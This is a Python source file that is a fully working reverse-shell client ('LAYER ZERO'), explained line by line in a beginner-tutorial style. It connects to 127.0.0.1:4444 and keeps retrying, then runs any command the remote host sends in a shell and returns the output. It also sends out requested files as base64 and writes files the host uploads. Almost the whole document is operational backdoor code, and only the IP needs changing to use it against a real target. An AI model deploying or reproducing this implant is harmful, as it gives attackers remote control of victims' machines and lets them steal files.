# ============================================================================================
# LIBRARY IMPORTS - These are tools other programmers created that we can use
# ============================================================================================
# Think of libraries like toolboxes - they give us ready-made tools so we don't have to
# build everything from scratch!

import socket     # Allows our program to communicate over the internet/network
import json       # Helps us organize data in a format that's easy to send and receive
import subprocess # Lets us run system commands (like 'ls', 'pwd', etc.) on this computer
import os         # Gives us tools to interact with the operating system (like changing directories)
import base64     # Converts files into text format so we can send them over the network
import time       # Provides time-related functions (like waiting/sleeping)


# ============================================================================================
# COLOR CODES - These make our terminal output colorful!
# ============================================================================================
# ANSI escape codes let us add colors to text in the terminal
# They work by sending special character sequences that tell the terminal to change color

GREEN = '\033[92m'   # Green color - for success messages and banner
YELLOW = '\033[93m'  # Yellow color - for informational messages
RED = '\033[91m'     # Red color - for error messages
RESET = '\033[0m'    # Reset to default color - always use this after colored text!


# ============================================================================================
# BANNER - This is the cool ASCII art that displays when the program starts
# ============================================================================================
# The 'r' before the quotes tells Python: "treat all backslashes as regular characters"
# Without the 'r', Python would think the backslashes mean something special and mess up our art!

BANNER = r''' 
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
'''


# ============================================================================================
# FUNCTION: server
# ============================================================================================
# PURPOSE: Connect to the host computer and establish a communication channel
# 
# THINK OF IT LIKE: Making a phone call to the host computer - we keep trying until they pick up!
# 
# HOW IT WORKS:
# 1. Create a connection socket (like picking up the phone)
# 2. Try to connect to the host's IP address and port number
# 3. If connection fails, wait 5 seconds and try again
# 4. Keep trying until we successfully connect!

def server(ip, port):
    global connection                                       # Make 'connection' available to all other functions in this program
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket (our phone line to the host)
    
    while True:                                             # Keep trying to connect forever until successful
        try:
            connection.connect((ip, port))                  # Try to connect to the host at this IP address and port
            break                                           # If we got here, connection worked! Exit the loop
        except ConnectionRefusedError:                      # If the host isn't listening yet (phone busy signal)
            time.sleep(5)                                   # Wait 5 seconds before trying again


# ============================================================================================
# FUNCTION: send
# ============================================================================================
# PURPOSE: Send data to the host computer
# 
# HOW IT WORKS:
# 1. Convert the data to JSON format (a standard way to organize data)
# 2. Encode it to bytes (computers send data as 1s and 0s)
# 3. Send it through our connection to the host

def send(data):
    json_data = json.dumps(data)                            # Step 1: Package data in JSON format
    connection.send(json_data.encode('utf-8'))              # Step 2 & 3: Convert to bytes and send to host


# ============================================================================================
# FUNCTION: recieve
# ============================================================================================
# PURPOSE: Receive data from the host computer
# 
# THINK OF IT LIKE: Listening on the phone - sometimes messages come in pieces, so we keep
#                   listening until we have the complete message!
# 
# HOW IT WORKS:
# 1. Start with an empty message
# 2. Receive chunks of data (up to 1024 bytes at a time)
# 3. Keep adding chunks until we have a complete JSON message
# 4. Convert from JSON and return the data

def recieve():
    json_data = ''                                          # Start with an empty message string
    while True:                                             # Keep receiving until we have a complete message
        try:
            json_data += connection.recv(1024).decode('utf-8')  # Receive up to 1024 bytes and add to our message
            return json.loads(json_data)                    # Try to convert from JSON - if it works, we're done!
        except ValueError:                                  # If JSON conversion fails, the message is incomplete
            continue                                        # Keep looping to receive more data


# ============================================================================================
# FUNCTION: run
# ============================================================================================
# PURPOSE: This is the main worker function - it waits for commands from the host and executes them!
# 
# THINK OF IT LIKE: A remote-controlled robot - the host sends commands, we do them and report back
# 
# COMMANDS WE UNDERSTAND:
#   - exit       : Stop running and disconnect
#   - cd [path]  : Change to a different directory
#   - download   : Send a file from this computer to the host
#   - upload     : Receive a file from the host and save it on this computer
#   - anything else: Run it as a system command and send back the result

def run():
    while True:                                             # Keep waiting for and executing commands forever
        command = recieve()                                 # Wait to receive a command from the host
        
        # ------------------
        # COMMAND: exit
        # ------------------
        if command == 'exit':                               # If host says to exit
            break                                           # Stop this loop (which ends the program)
        
        # ------------------
        # COMMAND: cd (change directory)
        # ------------------
        elif command[:2] == 'cd' and len(command) > 1:      # If command starts with 'cd' and has a path
            os.chdir(command[3:])                           # Change to the directory specified (skip 'cd ')
        
        # ------------------
        # COMMAND: download
        # ------------------
        # Host wants to download a file FROM this computer TO their computer
        elif command[:8] == 'download':                     # If command starts with 'download'
            with open(command[9:], 'rb') as f:              # Open the file they want (in read-binary mode)
                send(base64.b64encode(f.read()).decode('utf-8'))  # Read file, encode it, and send to host
        
        # ------------------
        # COMMAND: upload
        # ------------------
        # Host wants to upload a file FROM their computer TO this computer
        elif command[:6] == 'upload':                       # If command starts with 'upload'
            with open(command[7:], 'wb') as f:              # Create/open the file (in write-binary mode)
                file_data = recieve()                       # Receive the file data from the host
                f.write(base64.b64decode(file_data))        # Decode the data and write it to the file
        
        # ------------------
        # ANY OTHER COMMAND
        # ------------------
        # Run the command on this computer and send back the results
        else:
            # Create a new process to run the command (like opening a mini terminal)
            process = subprocess.Popen(
                command,                                    # The command to run
                shell=True,                                 # Run it in a shell (like typing in terminal)
                stdout=subprocess.PIPE,                     # Capture normal output
                stdin=subprocess.PIPE,                      # Allow input (if needed)
                stderr=subprocess.PIPE,                     # Capture error messages
                universal_newlines=True                     # Treat output as text (not bytes)
            )
            result = process.stdout.read() + process.stderr.read()  # Get both normal output and errors
            send(result)                                    # Send the results back to the host


# ============================================================================================
# MAIN PROGRAM EXECUTION
# ============================================================================================
# This is where the program actually starts running!
# 
# WHAT HAPPENS:
# 1. Show the cool banner
# 2. Try to connect to the host
# 3. Once connected, start waiting for and executing commands

print(GREEN + BANNER + RESET)                               # Display the ASCII art banner in GREEN
print(YELLOW + '[+] Connecting to host...' + RESET)         # Informational message in YELLOW
server('127.0.0.1', 4444)                                    # Connect to host at IP 127.0.0.1 on port 4444
print(GREEN + '[+] Connected! Awaiting commands...' + RESET)  # Success message in GREEN
run()                                                        # Start the main command loop (wait for and execute commands)
